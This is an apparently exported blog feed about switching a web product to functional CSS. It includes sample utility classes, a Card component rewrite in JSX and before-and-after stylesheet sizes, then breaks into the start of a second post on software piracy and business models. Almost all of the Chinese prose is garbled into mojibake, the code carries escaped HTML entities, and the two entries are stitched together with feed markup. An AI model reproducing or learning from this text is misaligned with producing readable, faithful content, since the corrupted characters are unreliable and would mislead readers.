ä¸æ˜¯çš„ï¼Œå®ƒä¸¦ä¸æ˜¯ä½ æƒ³ç”¨ä»€éº¼å°±ç”¨ä»€éº¼ï¼Œè€Œæ˜¯å…ˆæŠŠè¦ç¯„è¨‚å¥½ï¼Œä½ å†å¾å¯ä»¥ç”¨çš„ class è£¡é¢å»æŒ‘ä½ è¦ç”¨çš„å‡ºä¾†ã€‚ä¾‹å¦‚ä½ å€‘ç”¢å“çš„ç¶²ç«™çš„èƒŒæ™¯æœ‰å…©ç¨®ä¸»è‰²åˆ†åˆ¥æ˜¯ç´…è‰²èˆ‡è—è‰²ï¼Œæ–¼æ˜¯ä½ å¯«äº† .bg-red è·Ÿ .bg-blue é€™å…©å€‹ classã€‚
ä»Šå¤©æœ‰ä¸€å€‹æ–°äººä¾†ä½ å€‘å…¬å¸ï¼Œä»–æƒ³ç”¨ç´…è‰²å°±æœƒç›´æ¥ç”¨ bg-red è€Œä¸æ˜¯è‡ªå·±å†å¯«ä¸€å€‹ classã€‚å¦‚æœä»–çœŸçš„å†å¯«ä¸€å€‹ï¼Œé‚£ code review æ™‚ä¹Ÿå¯ä»¥è¼•æ˜“æŠ“åˆ°ï¼Œå› ç‚ºç”¨äº† functional css çš„å°ˆæ¡ˆé€šå¸¸ CSS æª”æ¡ˆå¯«å¥½å¾Œå°±ä¸æœƒå†è®Šå‹•äº†ï¼Œæ‰€ä»¥æœ‰æ›´å‹•çš„æ™‚å€™ç‰¹åˆ¥æ˜é¡¯ã€‚
å¦‚æœä»Šå¤©æ˜¯æŒ‰ç…§ä»¥å‰å¯« CSS çš„æ–¹å¼ï¼Œæœ‰å¯èƒ½ä»–åœ¨ CSS è£¡é¢å°±å·æ‡¶ç›´æ¥å¯«è‰²ç¢¼è€Œä¸æ˜¯ç”¨ä½ åœ¨ color.scss å®šç¾©å¥½çš„è®Šæ•¸ï¼Œæˆ–ä¹Ÿæœ‰å¯èƒ½ä»–åœ¨ color.scss è£¡é¢çœ¼æ®˜æ²’çœ‹åˆ° bg-redï¼Œæ‰€ä»¥è‡ªå·±åŠ å€‹ bg_red çš„ classã€‚ 
æ˜¯çš„ï¼Œé€™ä¸€æ¨£åœ¨ code review çš„æ™‚å€™å¯ä»¥æŠ“åˆ°ï¼Œä½†æˆ‘æƒ³è¡¨é”çš„æ˜¯å‰è€…è€—è²»çš„å¿ƒåŠ›æœƒæ¯”å¾Œè€…å°‘ï¼Œå› ç‚ºè¦æª¢æŸ¥çš„åœ°æ–¹æ¯”è¼ƒå°‘ã€‚
ä¸€ä½† functional CSS çš„ä¸»è¦ style.css å®Œæˆå¾Œï¼Œé€™ä»½æª”æ¡ˆåŒæ™‚ä¹Ÿä»£è¡¨ç¶²ç«™çš„è¦ç¯„ï¼Œå¯ä»¥ä½¿ç”¨çš„é¡è‰²ã€paddingã€marginã€å­—é«”ã€å­—é«”å¤§å°éƒ½åœ¨è£¡é¢äº†ï¼Œæƒ³ç”¨çš„æ™‚å€™åªèƒ½å¾é€™è£¡é¢æ‰¾ï¼Œä¸èƒ½è‡ªå·±éš¨æ„æ–°å¢ï¼Œæ‰€ä»¥ä½ å¯ä»¥å¾ˆè¼•é¬†å°±è¦å®šç¶²ç«™çš„ padding åªèƒ½æ˜¯ 4ã€8 æˆ–æ˜¯ 16ï¼Œæˆ–æ˜¯è¡Œè·åªèƒ½æœ‰ 1ã€1.25 è·Ÿ 1.5ã€‚
å…¶å¯¦ä»¥å‰ç”¨ SCSS æˆ–ä»»ä½• CSS é è™•ç†å™¨æ™‚ä¹Ÿå¯ä»¥é€™æ¨£åšï¼ŒæŠŠæ‰€æœ‰è¦ç¯„éƒ½è¨‚æˆè®Šæ•¸ï¼Œä¸¦ä¸”è¦å®šæ‰€æœ‰è¦å‰‡éƒ½åªèƒ½ç”¨é€™äº›è®Šæ•¸ã€‚ä½†æˆ‘èªç‚º functional CSS å¤©ç”Ÿå°±è˜Šå«è‘—è¦ç¯„åœ¨è£¡é¢ã€‚
ç¬¬ä¸‰å€‹å¥½è™•æ˜¯æª”æ¡ˆå¤§å°é©Ÿæ¸›ï¼Œå› ç‚º padding: 4px åªæœƒåœ¨ CSS æª”æ¡ˆè£¡é¢å‡ºç¾å”¯ä¸€ä¸€æ¬¡ï¼Œcolor: red ä¹Ÿåªæœƒå‡ºç¾å”¯ä¸€ä¸€æ¬¡ï¼Œä»¥ functional CSS çš„ framework Tachyons ä¾†èªªï¼Œminified è·Ÿ gzipped éå¾Œçš„ CSS å¤§å°æ˜¯ 14kbã€‚
ç¾åœ¨æ˜¯ 14kbï¼Œä»¥å¾Œä¹Ÿæœƒæ˜¯ 14kbï¼Œå› ç‚ºä½ æ‰€æœ‰éœ€è¦çš„è¦å‰‡éƒ½åœ¨è£¡é¢äº†ï¼Œä½ çš„ CSS å¤§å°ä¸æœƒå†éš¨è‘—ç¶²ç«™çš„è¤‡é›œåº¦å¢åŠ ï¼Œé€™ä¹Ÿæ˜¯å¾ˆæ£’çš„ä¸€é»ã€‚
å¦å¤–ä¸€å€‹ functional CSS framework Tailwind çš„ä½œè€…å¯«äº†ä¸€ç¯‡å¾ˆæ£’çš„æ–‡ç« ä¾†æ¢è¨ä¸€äº›å„ªç¼ºé»ï¼Œä¸¦ä¸”æœ‰è„ˆçµ¡åœ°å¸¶ä½ çœ‹ functional CSS çš„å„ªå‹¢åœ¨å“ªï¼Œæˆ‘è‡ªèªçµ•å°ä¸å¯èƒ½å¯«çš„æ¯”é‚£ç¯‡å¥½ï¼Œæ‰€ä»¥æœ‰èˆˆè¶£å†æ·±å…¥ç†è§£çš„å¯ä»¥åƒè€ƒï¼šCSS Utility Classes and â€œSeparation of Concernsâ€ã€‚
ç¸½ä¹‹å‘¢ï¼Œåœ¨çˆ¬äº†ä¸€å¤§å †æ–‡ç« ä»¥åŠè·ŸåŒäº‹è¨è«–éä»¥å¾Œï¼Œæˆ‘å€‘æ±ºå®šæŠŠå…¬å¸çš„ç”¢å“æ›æˆ functional CSSï¼Œæœƒæƒ³æ›çš„åŸå› æœ‰å…©å€‹ï¼š

CSS è¶Šä¾†è¶Šå¤šä»¥å¾Œå¾ˆé›£ç¶­è­·ï¼Œåªè¦ä¸å°å¿ƒä¸€å€‹å·æ‡¶å°±æˆäº†æœªä¾†çš„æŠ€è¡“å‚µ
CSS æª”æ¡ˆè¶Šä¾†è¶Šå¤§ï¼Œä½†å…¶å¯¦å¯ä»¥å°å¾ˆå¤š

Function CSS å¯¦æˆ°ç¶“é©—åˆ†äº«ä¹‹å‰çœ‹éä¸€ç¯‡ Full re-write in 10 days with tachyons and functional CSS: A case studyï¼Œä½œè€…è¬›è¿°ä»–å¦‚ä½•è¼•é¬†å¯«æ„çš„åœ¨åå¤©è£¡é¢æŠŠæ•´å€‹ç¶²ç«™æ”¹å¯«å®Œæˆã€‚
è€Œæˆ‘å€‘é‚£æ™‚é™¤äº†è¦é‡æ§‹é€™äº› CSS ä»¥å¤–é‚„è¦ä¿® bug è·Ÿé–‹ç™¼æ–°çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å‰å‰å¾Œå¾Œå¤§æ¦‚ä¸€å€‹æœˆæ‰æŠŠæ•´å€‹ç¶²ç«™æ›å®Œï¼Œè€Œä¸”å¯¦éš›ä¸‹å»é‡æ§‹æ‰ç™¼ç¾ä»¥å‰å¯«çš„æœ‰äº› CSS çœŸçš„æ˜¯è¶…é›£ç¶­è­·ï¼Œå› æ­¤åœ¨é€™éƒ¨åˆ†ä¹Ÿå¤šèŠ±äº†é»æ™‚é–“ã€‚
ä¸Šé¢æœ‰æåˆ°å¹¾å€‹ç›¸é—œçš„ CSS frameworkï¼Œä½†æˆ‘èªç‚º functional CSS çš„æ¦‚å¿µç°¡å–®å¥½æ‡‚ï¼Œè‡ªå·±å¾é ­å¯¦ä½œä¸€å€‹åè€Œæ¯”è¼ƒç¬¦åˆè‡ªå·±çš„éœ€æ±‚ï¼Œæ–¼æ˜¯å°±åƒè€ƒ Tachyons çš„ class name ä¾†å¯¦ä½œã€‚
ç¬¬ä¸€æ­¥å¤§æ¦‚æ˜¯å…ˆæŠŠä¸€äº›å¸¸ç”¨çš„ class å®šå‡ºä¾†ï¼Œä¾‹å¦‚èªªé¡è‰²ï¼š
.c-red &#123; color: $color-red; &#125;.c-yellow &#123; color: $color-yellow; &#125;.c-white &#123; color: white; &#125;.c-green &#123; color: $color-green; &#125;.c-grey-83 &#123; color: $color-grey-83; &#125;.c-grey-4a &#123; color: $color-grey-4a; &#125;.c-grey-bb &#123; color: $color-grey-bb; &#125;.c-grey-f8 &#123; color: $color-grey-f8; &#125;

é‚„æœ‰å¿…å‚™çš„ flex æ’ç‰ˆï¼š
.flex &#123; display: flex; &#125;.inline-flex &#123; display: inline-flex; &#125;.flex-auto &#123; flex: 1 1 auto; &#125;.flex-column  &#123; flex-direction: column; &#125;.flex-row     &#123; flex-direction: row; &#125;.flex-wrap    &#123; flex-wrap: wrap; &#125;.flex-nowrap    &#123; flex-wrap: nowrap; &#125;.items-start    &#123; align-items: flex-start; &#125;.items-end      &#123; align-items: flex-end; &#125;.items-center   &#123; align-items: center; &#125;.items-baseline &#123; align-items: baseline; &#125;.items-stretch  &#123; align-items: stretch; &#125;.justify-start   &#123; justify-content: flex-start; &#125;.justify-end     &#123; justify-content: flex-end; &#125;.justify-center  &#123; justify-content: center; &#125;.justify-between &#123; justify-content: space-between; &#125;.justify-around  &#123; justify-content: space-around; &#125;

é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å¯«ä¸€äº› utility classï¼š
.ellipsis &#123;  overflow: hidden;  text-overflow: ellipsis;&#125;  .limit-line &#123;  overflow: hidden;  text-overflow: ellipsis;  display: block;  display: -webkit-box;  -webkit-line-clamp: 1;  -webkit-box-orient: vertical;&#125;  .pointer:hover &#123; cursor: pointer; &#125;

é€™å°±å‘¼æ‡‰æˆ‘å‰é¢æåˆ°çš„ï¼Œä¸€å€‹ class name å…¶å¯¦å¯ä»¥æœ‰ä¸€å€‹ä»¥ä¸Šçš„è¦å‰‡ï¼Œåªè¦ä½ èƒ½å¾ class çš„åç¨±æ¸…æ¥šçŸ¥é“å®ƒåœ¨åšä»€éº¼å°±å¥½ã€‚
é‡æ§‹æ™‚çš„æµç¨‹å…¶å¯¦å¾ˆå›ºå®šï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯é€™å¹¾æ­¥ï¼š

é¸å®šè¦é‡æ§‹çš„ component
å…ˆå¾æœ€è£¡å±¤é–‹å§‹ï¼Œå³éµæª¢æŸ¥ï¼Œç¢ºå®šé€™å€‹ class name æ²’æœ‰å…¶ä»–å‰¯ä½œç”¨
æŠŠåŸæœ¬çš„ style æ›æˆ functional CSS
æŠŠåŸæœ¬çš„ class name ç§»é™¤

åœ¨æ­¤éç¨‹ä¸­å¯ä»¥é †ä¾¿æŠŠç¶²ç«™çš„æ¨£å¼åšå€‹è¦ç¯„ï¼Œä¾‹å¦‚èªªåŸæœ¬ padding æ˜¯ 5 çš„åœ°æ–¹çµ±ä¸€è®Šæˆ 4 ç­‰ç­‰ï¼Œç¶²ç«™å°±æœƒè®Šå¾—è¶Šä¾†è¶Šè¦ç¯„ã€‚
ä¸éé‡æ§‹æ™‚ç•¶ç„¶ä¹Ÿç¢°åˆ°ä¸€äº›å›°é›£ï¼Œé‚£å°±æ˜¯æœ‰äº›ä»¥å‰å¯«çš„ CSS ç‚ºäº†åœ–æ–¹ä¾¿æ²’æœ‰è€ƒæ…®åˆ°ç¶­è­·æ€§çš„å•é¡Œï¼Œåˆ°é ­ä¾†é€™å€‹å‘é‚„æ˜¯è½åˆ°è‡ªå·±èº«ä¸Šã€‚èˆ‰ä¾‹ä¾†èªªï¼Œæœ‰å€‹å…ƒä»¶å«åš Cardï¼Œéœ€æ±‚æ˜¯åœ¨é¦–é ä»¥åŠåœ¨é¤å»³é é¢å®ƒçš„ padding ä¸ä¸€æ¨£ï¼Œæ‰€ä»¥ä»¥å‰å°±é€™æ¨£å¯«ï¼š
// home_page.scss.home-page &#123;  .card &#123;     padding: 10px    &#125;&#125;  // restaurant_page.scss.restaurant-page &#123;  .card &#123;    padding: 15px;  &#125;&#125;  // card.scss.card &#123;  padding: 20px;&#125;

å•é¡Œæ˜¯ä»€éº¼ï¼Ÿå•é¡Œæ˜¯å¦‚æœä½ åªçœ‹ .card çš„ CSSï¼Œä½ æ ¹æœ¬ä¸æœƒç™¼ç¾å®ƒåœ¨ä¸åŒçš„é é¢ä¸‹æœƒæœ‰ä¸åŒçš„ paddingï¼å¦‚æœåªæ˜¯ padding çš„è©±å•é¡Œé‚„å°ï¼Œä½†å¦‚æœä¾ç…§é€™å€‹é‚è¼¯ç¹¼çºŒå¾€ä¸‹å¯«ï¼Œæœ‰å¯èƒ½é€£é¡è‰²è·Ÿ margin éƒ½è®Šäº†ï¼Œåƒæ˜¯ï¼š
.home-page &#123;  .card &#123;     padding: 10px    &amp;__title &#123;      margin-top: 20px;      background: red;     &#125;   &#125;&#125;

é€™ç¨®åšæ³•æ˜¯æŠŠé¡¯ç¤ºçš„é‚è¼¯æ”¾åœ¨ CSS è£¡é¢ï¼Œåˆ©ç”¨ CSS å»æ“æ§ï¼Œæ‰€ä»¥ JS è£¡é¢ä¸ç”¨é¡å¤–å¯«ä»»ä½•æ±è¥¿ï¼ŒCard é€™å€‹ component åœ¨ä¸åŒåœ°æ–¹å°±æœƒæœ‰ä¸åŒçš„æ¨£å¼ã€‚
ä½†æˆ‘å¾Œä¾†è¦ºå¾—é€™æ¨£ä¸æ˜¯ç¨®å¥½ä½œæ³•ï¼Œæ‡‰è©²è¦æŠŠé‚è¼¯ç§»å› JS è£¡é¢æ¯”è¼ƒå¥½ï¼Œæ‰€ä»¥æ”¹æˆé€™æ¨£å¯«ï¼š
// home page&lt;Card type=&quot;home&quot; /&gt;  // restaurant page&lt;Card type=&quot;restaurant&quot; /&gt;  // Card componentfunction Card(&#123; type &#125;) =&gt; (  &lt;div className=&#123;cx(&#123;    &#x27;padding-20&#x27;: !type,    &#x27;padding-10&#x27;: type === &#x27;home&#x27;,    &#x27;padding-15&#x27;: type === &#x27;restaurant&#x27;  &#125;)&#125; /&gt;)

åœ¨ä¸åŒåœ°æ–¹æˆ‘ç”¨ component çš„ props ä¾†å€åˆ†ï¼Œä¸¦ä¸”æŠŠé€™æ®µé‚è¼¯æ”¾åœ¨ component è£¡é¢ï¼Œæ¯”èµ· CSS çš„åšæ³•ç•¶ç„¶æœ‰å¥½æœ‰å£ï¼Œä½†è‡³å°‘å¯ä»¥ä¿è­‰ç•¶æˆ‘ render å–®ç´”çš„ &lt;Card /&gt; çš„æ™‚å€™ï¼Œåœ¨ä»»ä½•ä¸€å€‹é é¢å®ƒçš„æ¨£å¼éƒ½æœƒæ˜¯ä¸€è‡´çš„ï¼Œä¸ç”¨æ“”å¿ƒåœ¨ä¸åŒåœ°æ–¹æœƒçªç„¶å‡ºç¾ä¸åŒçš„æ¨£å¼ã€‚
åœ¨é‡æ§‹çš„éç¨‹ä¸­å…¶å¯¦ç™¼ç¾å¾ˆå¤šé€™ç¨®å•é¡Œï¼Œå¦‚æœæ²’æœ‰è¶æ—©é™¤æ‰çš„è©± CSS åªæœƒè¶Šä¾†è¶Šå¤šè€Œä¸”è¶Šä¾†è¶Šäº‚ï¼Œåˆ°æœ€å¾Œæœƒè®Šå¾—è¶…ç´šé›£ç¶­è­·ï¼Œæœƒå¾ˆå®¹æ˜“ç™¼ç”Ÿæ”¹ä¸€å€‹ class å£å…©å€‹åœ°æ–¹ï¼Œç‰½ä¸€é«®å‹•å…¨èº«çš„ç¾è±¡ã€‚å› æ­¤å‰›å¥½è¶è‘—æ”¹å¯«æˆ functional CSS çš„æ™‚å€™ä¾†è™•ç†é€™äº›å•é¡Œã€‚
è¨±å¤šäººå° functional CSS é‚„æœ‰ä¸€å€‹èª¤è§£ï¼Œé‚£å°±æ˜¯ä¸èƒ½å¯«ã€Œå…¶ä»–çš„ã€ CSSã€‚èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å‰é¢æåˆ° functinoal CSS è‡ªæˆä¸€å€‹è¦ç¯„ï¼Œæ²’æœ‰å¯«æˆ class çš„æ±è¥¿ä½ ä¸èƒ½ç”¨ï¼Œä½†å…¶å¯¦æœ‰äº›ç‰¹æ®Šæƒ…æ³é‚„æ˜¯å¯ä»¥çš„ã€‚
ä¾‹å¦‚èªªä½ ä»Šå¤©æœ‰ä¸€å€‹ div çš„é«˜æ˜¯ 333pxï¼Œé›£é“ä½ å°±è¦å¯«ä¸€å€‹ .height-333 çš„ class å—ï¼Ÿå¦‚æœçœŸæ˜¯é€™æ¨£çš„è©±é‚£çœŸçš„è·Ÿ inline style æ²’å…©æ¨£äº†ã€‚
ä½† functional CSS è€ƒé‡çš„é»æ‡‰è©²æ˜¯ã€Œèƒ½å¦é‡ç”¨ã€ï¼Œèƒ½å¤ é‡è¤‡ä½¿ç”¨çš„æ‰æŠŠå®ƒå¯«æˆ class nameï¼Œåƒæ˜¯é«˜ 333px é€™ç¨®æˆ‘å°±æœƒç›´æ¥ç”¨ styled-component æˆ–ç”šè‡³ç›´æ¥å¯« inline styleï¼Œä¸æœƒç‰¹åœ°çµ¦å®ƒä¸€å€‹ .height-333 çš„ classï¼Œå› ç‚ºæ•´å€‹ App å¯èƒ½å°±åªæœ‰å®ƒç”¨å¾—åˆ°ã€‚
æœ€å¾Œè®“æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹æ”¹å¯«çš„æˆæœï¼Œé€™æ˜¯æ”¹å¯«å‰ï¼ŒCSS å¤§ç´„ 400kbï¼ˆgzipped å‰ï¼‰ï¼š

é€™æ˜¯æ”¹å¯«å¾Œï¼Œå¯ä»¥çœ‹åˆ°å„é …æ•¸æ“šéƒ½ä¸‹é™å¾ˆå¤šï¼ŒCSS å¤§ç´„ 130kbï¼Œå…¶å¯¦é‚„å¯ä»¥å†å°ï¼Œæœƒæ¯”è¼ƒå¤§æ˜¯å› ç‚ºè£¡é¢æœ‰ä¸€äº›è½‰æˆ base64 çš„å°åœ–ï¼š

æ”¹å¯«ä¹‹å¾Œæ¸›å°‘äº†å°‡è¿‘ 70% çš„ CSS é«”ç©ã€‚
è€Œä¸”é‡é»æ˜¯ç„¡è«–ä»¥å¾Œ App å¤§äº†åå€é‚„æ˜¯ä¸€ç™¾å€ï¼ŒCSS éƒ½èƒ½å¤ ç¶­æŒåœ¨å·®ä¸å¤šçš„å¤§å°ï¼Œå› ç‚ºå¸¸ç”¨çš„å±¬æ€§éƒ½è¢«æˆ‘å€‘è®Šæˆ class name äº†ã€‚
æ”¹å¯«çš„é›£æ˜“åº¦å–æ±ºæ–¼ä½ åŸæœ¬ CSS çš„è³ªé‡ï¼Œåƒæˆ‘å€‘å¾ˆå¤š CSS ç‚ºäº†æ±‚å¿«æ²’æœ‰å¤šæ€è€ƒè€¦åˆå°±å¾ˆé«˜ï¼Œå¸¸å¸¸è¦åƒè€ƒå…©ä¸‰å€‹ CSS æª”æ¡ˆæ‰èƒ½æ‹¼æ¹Šå‡ºæœ€å¾Œ style çš„é•·ç›¸ã€‚ä½†å¦‚æœåŸæœ¬å°±æœ‰è™•ç†å¥½é€™å€‹å•é¡Œï¼Œé€Ÿåº¦æ‡‰è©²èƒ½å¤ å¿«æ»¿å¤šçš„ã€‚ä½†æ•´é«”ä¾†èªªæ”¹å¯«é‚„æ˜¯ç®—æ˜¯å®¹æ˜“ï¼Œè€Œä¸”æ¯æ¬¡æ”¹å¯«å®Œæˆå°±æ„Ÿå¾ˆå¤§ï¼Œå¯ä»¥ç›´æ¥æŠŠä¸€å¤§å † CSS è¦å‰‡åˆªæ‰ï¼Œæ»¿æœ‰å¿«æ„Ÿçš„ã€‚
æœ‰èˆˆè¶£çš„æœ‹å‹å¯ä»¥ç”¨é€™å€‹ç¶²ç«™å°è‡ªå·±çš„ç”¢å“åšæ¸¬è©¦ï¼šhttps://cssstats.com/ã€‚
ç¸½çµå¦‚æœè¦èªª functional CSS æœ‰ä»€éº¼ç¼ºé»çš„è©±ï¼Œæˆ‘ç›®å‰æƒ³åˆ°çš„å°±æ˜¯å‰›é–‹å§‹å­¸ç¿’éœ€è¦ä¸€æ®µæ™‚é–“ä»¥åŠ style å¤šçš„è©± HTML æœƒè®Šå¾—å……æ»¿ä¸€å † class nameï¼Œæ¯”è¼ƒé›£é–±è®€è€Œä¸”æª”æ¡ˆä¹Ÿè¼ƒå¤§ï¼Œä½†ç›¸è¼ƒä¹‹ä¸‹æˆ‘ä¾ç„¶èªç‚ºå„ªé»æ˜¯å¤šéç¼ºé»çš„ã€‚
å„ªé»å‰é¢ä¹Ÿå¤§æ¦‚éƒ½èªªéï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä¸ç”¨æ“”å¿ƒ CSS çš„è€¦åˆæ€§å•é¡Œï¼Œçµ•å°ä¸æœƒç™¼ç”Ÿæ”¹ä¸€å€‹ class name å£å…©å€‹ component çš„æƒ…æ³ï¼Œå› ç‚ºæ¯å€‹ class name éƒ½ä¸æœƒäº’ç›¸å¹²æ“¾ï¼Œä¹Ÿå¯ä»¥ä¿è­‰ä½ æŠŠé€™å€‹ component æ¬åˆ°ä»»ä½•åœ°æ–¹éƒ½é‚„æ˜¯é•·å¾—ä¸€æ¨£ï¼ŒèƒŒå¾Œä¸æœƒæœ‰ç‰¹åˆ¥çš„ CSS åœ¨é‚£é‚Šæä½ ã€‚
ä¹Ÿä¸ç”¨å†ç…©æƒ± class name è¦æ€éº¼å‘½åäº†å› ç‚ºä½ ä¸éœ€è¦ï¼Œé€™å€‹å°±å¯ä»¥ç¯€çœæ»¿å¤šæ™‚é–“çš„ã€‚ä¹Ÿä¸ç”¨å†æ‰‹å¯« CSS äº†ï¼Œæ‰€ä»¥é–‹ç™¼é€Ÿåº¦ä¹Ÿè®Šå¿«äº†ï¼Œå› ç‚ºä¸ç”¨å†åœ¨ CSS æª”æ¡ˆèˆ‡ component ä¹‹é–“åˆ‡æ›ï¼Œä½ é‚Šå¯« HTML çš„æ™‚å€™å°±å¯ä»¥é †æ‰‹æŠŠ style å¯«å®Œï¼Œå­˜æª”ä»¥å¾Œçœ‹å€‹ç•«é¢å†èª¿æ•´ä¸€ä¸‹å°±è¡Œäº†ï¼Œè·Ÿä»¥å‰ç›¸æ¯”æ­¥é©Ÿå°‘äº†å¾ˆå¤šã€‚
å…¶å¯¦å° CSS æˆ‘çš„ç¶“é©—ä¸æ˜¯é‚£éº¼å¤šï¼Œå¯èƒ½æœ‰å¾ˆå¤š case æ²’æœ‰è€ƒæ…®åˆ°æˆ–æ˜¯å„ªç¼ºé»æ²’æœ‰è¬›å¾—å¾ˆæ¸…æ¥šï¼Œå¦‚æœå° functional CSS æƒ³è¦æ›´æ·±å…¥ç ”ç©¶çš„ï¼Œæˆ‘æ–‡æœ«é™„çš„è³‡æ–™éƒ½å¾ˆæœ‰åƒè€ƒåƒ¹å€¼ï¼Œå¤§å®¶å¯ä»¥çœ‹çœ‹ã€‚
ä½†ç¸½ä¹‹ï¼Œæˆ‘ç¾åœ¨æ˜¯ functional CSS çš„æ”¯æŒè€…ä¹‹ä¸€äº†ã€‚
åƒè€ƒè³‡æ–™ï¼š

In defense of Functional CSS
Tachyons
Full re-write in 10 days with tachyons and functional CSS: A case study 
Tailwind: style your site without writing any CSS!
CSS Utility Classes and â€œSeparation of Concernsâ€
HN ä¸Šé¢çš„è¨è«–

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>functional CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>è»Ÿé«”é–‹ç™¼çš„æœªä¾†ï¼Œæ˜¯å¤§æ–—å…§æ™‚ä»£ï¼Ÿ</title>
    <url>/2018/11/14/future-of-software/</url>
    <content><![CDATA[
æœ¬æ–‡å¾ä»˜è²»è»Ÿé«”çš„å›°å¢ƒï¼Œè¬›åˆ°å»£å‘Šå•†æ¥­æ¨¡å¼ä»¥åŠä»˜è²»å¸³è™Ÿæ¨¡å¼ï¼Œå†è¬›åˆ°è¿‘å¹´ä¾†æ—¥è¶¨æµè¡Œçš„ã€Œçè³åˆ¶åº¦ã€ï¼Œä¾†è«‡è«‡å…§å®¹å‰µä½œçš„å›°å¢ƒï¼Œä»¥åŠç•¶é¢å°ç¶²éš›ç¶²è·¯å¿«é€Ÿç™¼å±•çš„å› æ‡‰ä¹‹é“ã€‚

è»Ÿé«”å¦‚ä½•è³ºéŒ¢åœ¨æˆ‘å‰›é–‹å§‹å¯«ç¨‹å¼çš„æ™‚å€™ï¼Œæˆ‘å°±æ›¾ç¶“æƒ³éï¼Œå¦‚æœæˆ‘åšå‡ºäº†ä¸€å€‹å¾ˆå¥½çš„éŠæˆ²ï¼Œæˆ‘è©²å¦‚ä½•è³ºéŒ¢ï¼Ÿï¼Œç°¡å–®å°±æ˜¯è³£å˜›ï¼Œä»˜äº†éŒ¢æˆ‘å°±çµ¦ä½ ç¨‹å¼ã€‚ä½†é€™æœ€å¤§çš„å•é¡Œæ˜¯ä½ å¦‚ä½•ç¢ºå®šè²·å®¶ä¸æœƒå°‡ä½ çš„ç”¢å“çµ¦å…¶ä»–äººï¼Ÿã€‚
æˆ‘é–‹å§‹æ€è€ƒå„ç¨®çš„å•†æ¥­æ¨¡å¼ï¼Œç™¼ç¾è¦è³£è»Ÿé«”ç«Ÿæ˜¯ä¸€ä»¶ç›¸ç•¶å›°é›£çš„äº‹ï¼Œé˜»æ­¢ç›œç‰ˆéå¸¸å›°é›£ï¼Œå…¶å¯¦é€™æœ¬è³ªçš„åŸå› åœ¨æ–¼è»Ÿé«”æ˜¯ä¸€ç¨®é‚Šéš›æˆæœ¬ç‚º 0 çš„ç”¢å“ã€‚
ä»˜è²»è»Ÿé«”çš„å›°å¢ƒç›œç‰ˆçŒ–ç—ï¼Œæ°¸é æ˜¯ä»˜è²»è»Ÿé«”æœ€å¤§çš„å›°å¢ƒã€‚è»Ÿé«”ä¹‹æ‰€ä»¥æœ‰é€™æ¨£çš„å•é¡Œï¼Œæ­£æ˜¯ç”±æ–¼å®ƒçš„ã€Œé‚Šéš›æˆæœ¬ç‚º 0 ã€ã€‚é‚Šéš›æˆæœ¬æ˜¯ç¶“æ¿Ÿå­¸çš„åè©ï¼Œæ„æ€æ˜¯ç•¶ä½ å¢åŠ ä¸€ä»½ç”¢å“æ™‚æ‰€éœ€è¦å¢åŠ çš„æˆæœ¬ã€‚ç”Ÿç”¢ä¸€å°æ±½è»Šçš„æˆæœ¬å¾ˆå¤§ï¼Œä½†ç”Ÿç”¢ 10000 é‡æ±½è»Šå¯èƒ½å¹³å‡ä¸‹ä¾†å°±æ²’é‚£éº¼å¤§ã€‚è€Œè»Ÿé«”å‰‡æ˜¯ä¸€å€‹é‚Šéš›æˆæœ¬ç‚º 0 çš„ç”¢å“ï¼Œä½ è¦å¤šè³£çµ¦ä¸€å€‹ä½¿ç”¨è€…ï¼Œé ‚å¤šå…‰ç¢Ÿå¤šç‡’ä¸€ç‰‡ï¼Œä¸ç„¶å“ªæœ‰ä»€éº¼æˆæœ¬ï¼Ÿ
ä½ ä»¥ç‚ºé€™æ¨£å¾ˆå¥½å—ï¼Ÿæ˜¯çš„ï¼Œæˆ–è¨±ä½ å¯ä»¥ç¯€çœæˆæœ¬ï¼Œä½† å°æ–¼ç›œç‰ˆè€…è€Œè¨€æ›´å¥½ ã€‚ä½ é–‹ç™¼è»Ÿé«”éœ€è¦æˆæœ¬ï¼Œä½†ç›œç‰ˆçš„äººé€£é–‹ç™¼çš„æˆæœ¬çš„çœä¸‹ä¾†äº†ï¼Œé‚£å°ç›œç‰ˆè€…è€Œè¨€ï¼Œå¯çœŸçš„æ˜¯ã€Œç„¡æœ¬ç”Ÿæ„ã€ã€‚ä¸åªæ˜¯è»Ÿé«”ï¼Œå„å¼å„æ¨£çš„å‰µä½œï¼Œåªè¦æ˜¯é‚Šéš›æˆæœ¬ç‚º 0 çš„ï¼Œä¾‹å¦‚æ–‡ç« ã€åœ–ç•«ã€å½±ç‰‡ï¼Œå¯ä»¥è¢«è¼•æ˜“ç”¨é›»è…¦è¤‡è£½çš„ï¼Œéƒ½å¯èªªæ˜¯é‚Šéš›æˆæœ¬ç‚º 0 çš„ç”¢å“ï¼Œå› æ­¤å¾ˆå®¹æ˜“é­å—ç›œç‰ˆå¨è„…ã€‚
å› æ­¤ï¼Œé‚Šéš›æˆæœ¬ç‚º 0 çš„ç”¢å“ï¼Œç”¨å…è²»çš„å•†æ¥­æ¨¡å¼æœ€æœ‰æ•ˆç‡ï¼Œæˆ‘ä¸¦ä¸æ˜¯èªªä¸è©²æ”¯æŒä½¿ç”¨è€…ä»˜è²»ï¼Œåªæ˜¯åœ¨æ•ˆç‡ä¸Šï¼Œå…è²»çš„å•†æ¥­æ¨¡å¼æ•ˆç‡è¼ƒä½³ã€‚
ä¹Ÿå› ç‚ºé€™å€‹åŸå› ï¼Œå°è‡´å»£å‘Šçš„å•†æ¥­æ¨¡å¼èˆˆèµ·ã€‚
